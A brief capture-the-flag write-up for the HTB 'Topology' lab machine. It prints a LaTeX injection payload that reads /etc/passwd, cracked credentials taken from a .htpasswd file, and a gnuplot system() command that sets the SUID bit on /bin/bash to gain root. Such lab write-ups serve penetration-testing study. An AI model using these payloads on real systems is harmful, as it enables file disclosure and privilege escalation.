latex.topology.htb

used latex injection:

``` latex
$\lstinputlisting{/etc/passwd}$
```

eventually used that to read the .htpasswd of the dev site and cracked the hash to get the creds:

vdaisley : calculus20

we can use pspy to see a script is running gnuplot and running and .plt file in `/opt/gnuplot`

we can create `root.plt` that abuses the `system ""` function to add a suidbit to bash so we can run it as root

```bash
echo 'system "chmod u+s /bin/bash"' > /opt/gnuplot/root.plt
```

then once, the script executes we can check permissions with `ls -l /bin/bash` and then run `bash -p` to run bash with elevated permissions
